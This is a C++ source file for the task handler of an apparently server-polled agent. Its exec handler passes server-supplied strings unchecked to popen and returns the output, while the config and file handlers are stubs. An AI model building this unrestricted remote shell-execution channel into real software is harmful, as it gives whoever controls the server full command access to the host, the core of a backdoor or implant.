#include "task_handler.h"
#include "logger.h"
#include <spdlog/spdlog.h>
#include <string>
#include <vector>
#include <sstream>
#include <array>
#include <cstdio>

namespace wa {

TaskHandler::TaskHandler(Config& cfg, HttpClient& client)
    : cfg_(cfg), client_(client) {}

void TaskHandler::process(const TaskInfo& task) {
    WA_LOG_INFO("Received task: session_id={}, task_code={}, options={}",
                task.session_id, task.task_code, task.options);

    if (task.task_code == "TIMEOUT") {
        handleTimeout(task);
    }
    else if (task.task_code == "CMD" || task.task_code == "EXEC" || task.task_code == "TASK") {
        handleExec(task);
    }
    else if (task.task_code == "CONF") {
        handleConf(task);
    }
    else if (task.task_code == "FILE") {
        handleFile(task);
    }
    else {
        sendResult(task, -1, "Unknown task_code: " + task.task_code);
    }
}

// ====================== TIMEOUT ======================
void TaskHandler::handleTimeout(const TaskInfo& task) {
    try {
        int new_interval = std::stoi(task.options);
        if (new_interval > 0) {
            cfg_.poll_interval_sec = new_interval;
            cfg_.save();
            sendResult(task, 0, "poll_interval_sec set to " + std::to_string(new_interval));
        } else {
            sendResult(task, -2, "Invalid timeout value");
        }
    } catch (...) {
        sendResult(task, -2, "Failed to parse timeout value");
    }
}

// ====================== CMD / EXEC ======================
void TaskHandler::handleExec(const TaskInfo& task) {
    std::string command = task.options;

    if (command.empty()) {
        sendResult(task, -1, "Command is empty");
        return;
    }

    WA_LOG_INFO("Executing: {}", command);

    std::array<char, 8192> buffer{};
    std::string output;
    int exit_code = -1;

    // Выполняем команду и захватываем stdout + stderr
    FILE* pipe = popen((command + " 2>&1").c_str(), "r");
    if (!pipe) {
        sendResult(task, -1, "Failed to start command");
        return;
    }

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        output += buffer.data();
    }

    exit_code = pclose(pipe) / 256;

    // Ограничиваем размер вывода (сервер может не принять слишком большой ответ)
    if (output.length() > 6000) {
        output = output.substr(0, 6000) + "\n... [output truncated]";
    }

    if (output.empty()) {
        output = "(no output)";
    }

    WA_LOG_INFO("Command finished. Exit code: {}, Output size: {} bytes", exit_code, output.length());

    sendResult(task, exit_code, output);
}

// ====================== Заглушки ======================
void TaskHandler::handleConf(const TaskInfo& task) {
    sendResult(task, 0, "CONF task not implemented yet");
}

void TaskHandler::handleFile(const TaskInfo& task) {
    sendResult(task, 0, "FILE task not implemented yet");
}

// ====================== sendResult ======================
void TaskHandler::sendResult(const TaskInfo& task, int code,
                             const std::string& message,
                             const std::vector<std::string>& files) {
    try {
        auto resp = client_.sendResult(task.session_id, code, message, files);

        if (resp.code == 0) {
            WA_LOG_INFO("Task {} completed successfully (code={})", task.session_id, code);
        } else {
            WA_LOG_WARN("Failed to send result for task {}: server returned code={}",
                        task.session_id, resp.code);
        }
    } catch (const std::exception& e) {
        WA_LOG_ERROR("Failed to send result for task {}: {}", task.session_id, e.what());
    }
}

} // namespace wa
